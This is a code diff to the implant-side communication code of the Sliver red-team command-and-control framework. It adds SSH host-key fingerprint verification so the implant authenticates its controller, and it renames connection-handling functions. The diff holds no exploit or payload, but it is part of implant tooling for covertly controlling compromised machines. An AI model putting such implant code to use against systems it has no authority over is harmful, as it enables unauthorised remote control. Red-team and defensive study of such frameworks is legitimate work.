@@ -23,6 +23,11 @@ import (
 	"log"
 	// {{end}}
 
+	"crypto/sha256"
+	"encoding/base64"
+	"errors"
+	"net"
+
 	"fmt"
 	"sync"
 	"time"
@@ -31,6 +36,11 @@ import (
 	"golang.org/x/crypto/ssh"
 
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+)
+
+var (
+	// Used to authenticate the server when using SSH.
+	serverKeyFingerprint = `{{.Config.ServerFingerprint}}`
 )
 
 // Comm - Wrapper around a net.Conn, adding SSH infrastructure for encryption and tunneling
@@ -44,6 +54,7 @@ type Comm struct {
 	sshConn       ssh.Conn          // SSH Connection, that we will mux
 	clientConfig  *ssh.ClientConfig // We are the talking to the C2 server.
 	serverConfig  *ssh.ServerConfig // We are the pivot of an implant
+	fingerprint   string            // A key fingerprint to authenticate the server/pivot.
 
 	// Connection management
 	requests <-chan *ssh.Request   // Keep alive
@@ -52,18 +63,35 @@ type Comm struct {
 	pending  int
 }
 
-// NewComm - Creates a SSH-based connection multiplexer.
-func NewComm() (mux *Comm) {
-	mux = &Comm{
-		clientConfig: &ssh.ClientConfig{},
-		serverConfig: &ssh.ServerConfig{},
-		mutex:        &sync.RWMutex{},
+// verifyServer - Check the server's host key fingerprint. We have an exampled compiled in above.
+func (comm *Comm) verifyServer(hostname string, remote net.Addr, key ssh.PublicKey) error {
+	expect := serverKeyFingerprint
+	if expect == "" {
+		return errors.New("No server key fingerprint")
 	}
-	return
+
+	// calculate the SHA256 hash of an SSH public key
+	bytes := sha256.Sum256(key.Marshal())
+	got := base64.StdEncoding.EncodeToString(bytes[:])
+
+	_, err := base64.StdEncoding.DecodeString(expect)
+	if _, ok := err.(base64.CorruptInputError); ok {
+		return fmt.Errorf("MD5 fingerprint (%s), update to SHA256 fingerprint: %s", expect, got)
+	} else if err != nil {
+		return fmt.Errorf("Error decoding fingerprint: %w", err)
+	}
+	if got != expect {
+		return fmt.Errorf("Invalid fingerprint (%s)", got)
+	}
+
+	// {{if .Config.Debug}}
+	log.Printf("Fingerprint %s", got)
+	// {{end}}
+	return nil
 }
 
-// serveActiveConnection - Serves all outbound (server <- implant) and inbound (server -> implant) connections.
-func (comm *Comm) serveActiveConnection() {
+// handleServerIncoming - Serves all outbound (server <- implant) and inbound (server -> implant) connections.
+func (comm *Comm) handleServerIncoming() {
 	defer func() {
 		// {{if .Config.Debug}}
 		log.Printf("Closing SSH client connection (Mux remote addr: %s)...", comm.RemoteAddress)
@@ -87,8 +115,7 @@ func (comm *Comm) serveActiveConnection() {
 // handleConnInbound - Handle, validate and pipe a single logical connection (blocking)
 func (comm *Comm) handleServerInbound(ch ssh.NewChannel) {
 
-	// Parse incoming connection request details:
-	// UUID-RANDOM-32H3-32HJ proto lhost:lport rhost:rport
+	// Parse incoming connection request details
 	info := &sliverpb.ConnectionInfo{}
 	err := proto.Unmarshal(ch.ExtraData(), info)
 	if info.ID == "" || err != nil {
@@ -128,7 +155,7 @@ func (comm *Comm) handleServerInbound(ch ssh.NewChannel) {
 		comm.pending--
 	}()
 
-	// The route will handle the stream.
+	// The route will handle the stream (blocking)
 	routeForwardConn(route, info, stream)
 }
 
